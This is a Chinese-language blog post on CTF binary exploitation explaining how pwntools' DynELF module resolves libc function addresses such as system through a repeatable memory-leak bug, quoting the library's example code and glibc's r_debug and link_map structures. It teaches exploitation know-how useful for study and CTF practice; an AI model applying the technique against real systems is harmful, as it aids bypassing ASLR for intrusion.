+<h1 id="DynELF泄露函数地址"><a href="#DynELF泄露函数地址" class="headerlink" title="DynELF泄露函数地址"></a>DynELF泄露函数地址</h1><p>通常，要想获得某个库函数在内存中的地址，方法是先泄露同一个库中已知函数的地址，然后计算偏移。这样做的前提是能够知道两个函数之间的偏移是多少，但在不同服务器上，<code>glibc</code>的版本差异使得偏移不尽相同。当面对未知版本的<code>glibc</code>时，通常有两种办法：</p>
+<ul>
+<li>先泄露任意两个函数的地址，再通过一些工具进行版本查询</li>
+<li><code>DynELF</code></li>
+</ul>
+<h2 id="DynELF模块"><a href="#DynELF模块" class="headerlink" title="DynELF模块"></a>DynELF模块</h2><p><code>DynELF</code>是<code>Pwntools</code>中一个非常有用的模块，当目标程序存在可以反复触发的，对任意给定地址均有效的信息泄露漏洞时，就可以使用该模块。官方文档给出的例子如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Assume a process or remote connection</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare a function that takes a single address, and</span></span><br><span class="line"><span class="comment"># leaks at least one byte at that address.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, enhex(data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>)))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the sake of this example, let&#x27;s say that we</span></span><br><span class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></span><br><span class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></span><br><span class="line">main   = <span class="number">0xfeedf4ce</span></span><br><span class="line">libc   = <span class="number">0xdeadb000</span></span><br><span class="line">system = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></span><br><span class="line"><span class="comment"># we can resolve the address of anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We do not actually need to have a copy of the target</span></span><br><span class="line"><span class="comment"># binary for this to work.</span></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></span><br><span class="line"><span class="comment"># we can speed up some of the steps.</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">&#x27;./pwnme&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></span><br><span class="line"><span class="comment"># given a pointer into it.</span></span><br><span class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>)      == system</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，想要使用<code>DynELF</code>，首先需要一个<code>leak()</code>函数，该函数至少需要获取到某个地址上1个字节的数据，然后将这个函数作为参数生成一个<code>DynELF</code>对象<code>d = DynELF(leak, main)</code>，就完成了初始化工作。接下来，就可以搜索内存，获得所需的函数地址了。</p>
+<h2 id="DynELF原理"><a href="#DynELF原理" class="headerlink" title="DynELF原理"></a>DynELF原理</h2><p>通过信息泄露漏洞，<code>DynELF</code>将对任意内存进行搜索，首先找到<code>ELF</code>文件在内存中的基地址，然后定位到<code>glibc</code>并对其进行解析，从而找到所需函数符号的地址，具体步骤如下：</p>
+<ul>
+<li>搜索内存找到字符串<code>\x7ELF</code>，该字符串的地址即为<code>ELF</code>的基地址</li>
+<li>解析<code>ELF</code>文件，得到<code>DYNAMIC</code>段的基地址，并通过该地址得到<code>link_map</code>链表，此时有两种方法：<ul>
+<li>通过<code>.dynamic</code>里的<code>DT_DEBUG</code>，它是一个指向<code>struct r_debug</code>的指针，其第二个元素指向<code>link_map</code></li>
+<li>通过<code>.got.plt</code>节，其前3项分别是<code>.dynamic</code>、<code>link_map</code>和<code>_dl_runtime_resolve</code>的地址</li>
+</ul>
+</li>
+<li>遍历<code>link_map</code>，对比<code>l_name</code>找到<code>glibc</code>后，通过<code>l_addr</code>获得<code>glibc</code>的基地址</li>
+<li>解析<code>glibc</code>，通过<code>DT_GNU_HASH</code>、<code>DT_STRTAB</code>和<code>DT_SYMTAB</code>分别得到哈希表<code>(.gnu.hash/.hash)</code>、字符串表<code>(.strtab)</code>和符号表<code>(.symtab)</code></li>
+<li>通过哈希表找到所需函数<code>(如system)</code>的内存地址</li>
+</ul>
+<p><code>struct r_debug</code>和<code>struct link_map</code>的定义如下所示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// elf/link.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">r_debug</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* Version number for this protocol.  It should be greater than 0.  */</span></span><br><span class="line">    <span class="keyword">int</span> r_version;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">r_map</span>;</span>	<span class="comment">/* Head of the chain of loaded objects.  */</span></span><br><span class="line">    <span class="comment">/* This is the address of a function internal to the run-time linker,</span></span><br><span class="line"><span class="comment">       that will always be called when the linker begins to map in a</span></span><br><span class="line"><span class="comment">       library or unmap it, and again when the mapping change is complete.</span></span><br><span class="line"><span class="comment">       The debugger can set a breakpoint at this address if it wants to</span></span><br><span class="line"><span class="comment">       notice shared object mapping changes.  */</span></span><br><span class="line">    ElfW(Addr) r_brk;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">	<span class="comment">/* This state value describes the mapping change taking place when</span></span><br><span class="line"><span class="comment">	   the `r_brk&#x27; address is called.  */</span></span><br><span class="line">	RT_CONSISTENT,		<span class="comment">/* Mapping change is complete.  */</span></span><br><span class="line">	RT_ADD,			<span class="comment">/* Beginning to add a new object.  */</span></span><br><span class="line">	RT_DELETE		<span class="comment">/* Beginning to remove an object mapping.  */</span></span><br><span class="line">      &#125; r_state;</span><br><span class="line">    ElfW(Addr) r_ldbase;	<span class="comment">/* Base address the linker is loaded at.  */</span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li>《CTF竞赛权威指南（Pwn篇）》</li>
+<li><a target="_blank" rel="noopener" href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">Return-to-csu: A New Method to Bypass 64-bit Linux ASLR</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/">pwntools — pwntools 4.7.0 documentation</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Pwn/" rel="tag"><i class="fa fa-tag"></i> Pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/posts/heap-exp2/" rel="prev" title="堆利用(下)">
+                  <i class="fa fa-chevron-left"></i> 堆利用(下)
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lu0k</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script size="250" alpha="0.5" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
